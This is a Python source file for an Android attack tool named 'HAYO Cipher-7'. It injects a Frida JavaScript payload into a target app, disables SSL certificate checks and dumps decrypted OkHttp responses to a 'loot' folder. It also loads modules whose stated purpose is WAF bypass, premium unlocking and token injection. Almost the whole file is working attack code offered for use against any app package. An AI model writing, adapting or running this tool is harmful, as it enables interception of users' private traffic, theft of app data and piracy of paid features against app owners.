#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
HAYO Cipher-7 — Deep Cloud Interception v2 (frida_hijack.py)
=============================================================
Hijacks the app's network client from INSIDE its memory with Frida to bypass
SSL pinning and read OkHttp3 responses AFTER SSL decryption / BEFORE the UI,
plus cloud data exfiltration, WAF bypass, premium unlock, and token injection.

USAGE
-----
  python frida_hijack.py com.target.package [options]

Options:
  -n / --attach       attach to running app
  -H / --host HOST:PORT   remote frida-server
  -m / --mode MODE    interception mode: cloud|waf|premium|tokens|all (default: all)
  -s / --script FILE  custom JS payload
"""

import argparse
import sys
import os

try:
    import frida
except ImportError:
    print("[!] frida is not installed. Run:  pip install frida frida-tools")
    sys.exit(1)

def _setup_console():
    for stream in (sys.stdout, sys.stderr):
        try:
            stream.reconfigure(encoding="utf-8", errors="replace")
        except Exception:
            pass
    if os.name == "nt":
        try:
            os.system("chcp 65001 >nul")
        except Exception:
            pass
        try:
            import ctypes
            k = ctypes.windll.kernel32
            k.SetConsoleMode(k.GetStdHandle(-11), 7)
        except Exception:
            pass

_setup_console()
RESET = "\033[0m"
BOLD = "\033[1m"
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BG_RED = "\033[41m"

def banner():
    print(CYAN + BOLD + r"""
  ╦ ╦╔═╗╦ ╦╔═╗   ╔═╗╦╔═╗╦ ╦╔═╗╦═╗ ┌┐            ┬
  ╠═╣╠═╣╚╦╝║ ║   ║  ║╠═╝╠═╣║╣ ╠╦╝ ─┼─  Deep Cloud Interception v2
  ╩ ╩╩ ╩ ╩ ╚═╝   ╚═╝╩╩  ╩ ╩╚═╝╩╚═ └┘            ┴
  Modes: cloud | waf | premium | tokens | all
""" + RESET)

# ── Core SSL pinning bypass + OkHttp interception ──
CORE_PAYLOAD = r"""
Java.perform(function() {
    console.log("[*] HAYO Cipher-7 v2: Initiating Deep Cloud Interception...");
    try {
        var TrustManagerImpl = Java.use('com.android.org.conscrypt.TrustManagerImpl');
        TrustManagerImpl.verifyChain.implementation = function (untrustedChain, trustAnchorChain, host, clientAuth, ocspData, tlsSctData) {
            return untrustedChain;
        };
    } catch (e) {}
    try {
        var Response = Java.use("okhttp3.Response");
        var Charset = Java.use("java.nio.charset.Charset");
        Response.body.overload().implementation = function() {
            var body = this.body();
            if (body != null) {
                try {
                    var source = body.source();
                    source.request(9223372036854775807);
                    var buffer = source.buffer();
                    var responseBodyString = buffer.clone().readString(Charset.forName("UTF-8"));
                    console.log("\n==============================================");
                    console.log("[CLOUD DATA EXTRACTED]");
                    console.log("URL: " + this.request().url().toString());
                    console.log("DATA: \n" + responseBodyString);
                    console.log("==============================================\n");
                } catch (err) {}
            }
            return this.body();
        };
    } catch (e) {}
});
"""

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

def load_module_js(mode):
    """Load additional Cipher-7 JS modules based on mode."""
    modules = []
    if mode in ("all", "cloud"):
        p = os.path.join(BASE_DIR, "cloud_breaker.js")
        if os.path.isfile(p):
            with open(p, "r", encoding="utf-8") as f: modules.append(("cloud_breaker.js", f.read()))
    if mode in ("all", "waf"):
        p = os.path.join(BASE_DIR, "waf_bypass.js")
        if os.path.isfile(p):
            with open(p, "r", encoding="utf-8") as f: modules.append(("waf_bypass.js", f.read()))
    if mode in ("all", "premium"):
        p = os.path.join(BASE_DIR, "premium_ultimate.js")
        if os.path.isfile(p):
            with open(p, "r", encoding="utf-8") as f: modules.append(("premium_ultimate.js", f.read()))
    if mode in ("all", "tokens"):
        p = os.path.join(BASE_DIR, "infinite_tokens.js")
        if os.path.isfile(p):
            with open(p, "r", encoding="utf-8") as f: modules.append(("infinite_tokens.js", f.read()))
    return modules

def _colorize(text: str) -> str:
    if "[CLOUD DATA EXTRACTED]" in text:
        return BG_RED + BOLD + text + RESET
    if text.strip().startswith("URL:"):
        return CYAN + BOLD + text + RESET
    if text.strip().startswith("DATA:"):
        return GREEN + BOLD + text + RESET
    if "====" in text:
        return YELLOW + text + RESET
    if text.strip().startswith("[*]"):
        return CYAN + text + RESET
    if "[CLOUD_BREAKER]" in text or "[WAF_BYPASS]" in text:
        return CYAN + BOLD + text + RESET
    if "[PREMIUM_ULTIMATE]" in text or "[INFINITE_TOKENS]" in text:
        return GREEN + BOLD + text + RESET
    if "cloud" in text.lower() or "premium" in text.lower() or "token" in text.lower():
        return YELLOW + text + RESET
    return text

LOOT = None

def _loot_write(text):
    if LOOT is not None:
        try:
            LOOT.write(text + "\n")
            LOOT.flush()
        except Exception:
            pass

def on_log(level, text):
    if text is None:
        return
    print(_colorize(text))
    _loot_write(text)

def on_message(message, data):
    if message.get("type") == "error":
        print(RED + BOLD + "[JS ERROR] " + RESET + str(message.get("description", message)))
        stack = message.get("stack")
        if stack:
            print(RED + str(stack) + RESET)
    elif message.get("type") == "send":
        payload = message.get("payload")
        ptype = ""
        if isinstance(payload, dict):
            ptype = payload.get("type", "")
        color = GREEN
        if "cloud" in str(payload).lower():
            color = CYAN
        if "premium" in str(payload).lower() or "token" in str(payload).lower():
            color = GREEN
        if "waf" in str(payload).lower():
            color = YELLOW
        print(color + "[MSG] " + RESET + str(payload))
        _loot_write("[MSG] " + str(payload))

def get_device(host, serial):
    if serial:
        print(YELLOW + f"[*] Selecting device '{serial}' ..." + RESET)
        return frida.get_device(serial, timeout=10)
    if host:
        print(YELLOW + f"[*] Connecting to remote frida-server at {host} ..." + RESET)
        return frida.get_device_manager().add_remote_device(host)
    print(YELLOW + "[*] Waiting for USB device / emulator ..." + RESET)
    return frida.get_usb_device(timeout=10)

def main():
    ap = argparse.ArgumentParser(description="HAYO Cipher-7 — Frida deep cloud interception v2")
    ap.add_argument("package_name", nargs="?", help="Target app package (e.g. com.target.app)")
    ap.add_argument("-n", "--attach", action="store_true", help="Attach to a running app instead of spawning")
    ap.add_argument("-H", "--host", help="Networked frida-server HOST:PORT (e.g. 127.0.0.1:27042)")
    ap.add_argument("-D", "--device", help="Target device id (adb serial, e.g. emulator-5554)")
    ap.add_argument("-m", "--mode", default="all", choices=["all", "cloud", "waf", "premium", "tokens"], help="Cipher-7 interception mode (default: all)")
    ap.add_argument("-s", "--script", help="Path to custom Frida .js payload")
    ap.add_argument("--no-core", action="store_true", help="Skip core SSL/OkHttp payload (module-only mode)")
    args = ap.parse_args()

    # Build combined payload
    payload_parts = []
    if not args.no_core:
        payload_parts.append(("core", CORE_PAYLOAD))
    
    if args.script:
        try:
            with open(args.script, "r", encoding="utf-8") as fh:
                payload_parts.append(("custom", fh.read()))
            print(GREEN + f"[+] Loaded external payload: {args.script}" + RESET)
        except Exception as e:
            print(RED + f"[!] Could not read script '{args.script}': {e}" + RESET)
            sys.exit(1)
    else:
        modules = load_module_js(args.mode)
        for name, content in modules:
            payload_parts.append((name, content))
            print(GREEN + f"[+] Loaded module: {name}" + RESET)

    package = args.package_name or input(CYAN + "Enter target package name: " + RESET).strip()
    if not package:
        print(RED + "[!] No package name provided." + RESET)
        sys.exit(1)

    banner()

    global LOOT
    import datetime
    loot_dir = os.path.join(BASE_DIR, "loot")
    try:
        os.makedirs(loot_dir, exist_ok=True)
        stamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        loot_path = os.path.join(loot_dir, f"capture_{package}_{args.mode}_{stamp}.txt")
        LOOT = open(loot_path, "w", encoding="utf-8")
        print(GREEN + f"[+] Saving all captured data to: {loot_path}" + RESET)
    except Exception as e:
        print(YELLOW + f"[*] (could not open loot file: {e})" + RESET)

    try:
        device = get_device(args.host, args.device)
        print(GREEN + f"[+] Device: {device}" + RESET)
    except Exception as e:
        print(RED + BOLD + f"[!] Could not reach a device: {e}" + RESET)
        print(YELLOW + "    Make sure frida-server is running on the emulator (adb shell '/data/local/tmp/frida-server &')." + RESET)
        sys.exit(1)

    pid = None
    try:
        if args.attach:
            print(YELLOW + f"[*] Attaching to running '{package}' ..." + RESET)
            session = device.attach(package)
        else:
            print(YELLOW + f"[*] Spawning '{package}' (fresh start) ..." + RESET)
            pid = device.spawn([package])
            session = device.attach(pid)
    except Exception as e:
        print(RED + BOLD + f"[!] Failed to start/attach to '{package}': {e}" + RESET)
        sys.exit(1)

    # Merge all payload parts
    combined_payload = "\n\n// === Cipher-7 Modules ===\n".join(
        [f"// === {name} ===\n{content}" for name, content in payload_parts]
    )

    script = session.create_script(combined_payload)
    try:
        script.set_log_handler(on_log)
    except Exception:
        pass
    script.on("message", on_message)
    script.load()
    print(GREEN + BOLD + f"[+] Payload injected. Mode: {args.mode}. Interception ACTIVE." + RESET)

    if pid is not None:
        device.resume(pid)
        print(GREEN + "[+] App resumed." + RESET)

    print(CYAN + BOLD + f"\n[*] [{args.mode.upper()}] Listening — press Ctrl+C to stop.\n" + RESET)
    try:
        sys.stdin.read()
    except KeyboardInterrupt:
        pass
    finally:
        try:
            session.detach()
        except Exception:
            pass
        if LOOT is not None:
            try:
                LOOT.close()
                print(GREEN + f"[+] Captured data saved in the 'loot' folder." + RESET)
            except Exception:
                pass
        print(YELLOW + "\n[*] Session closed. HAYO Cipher-7 v2 out." + RESET)

if __name__ == "__main__":
    main()
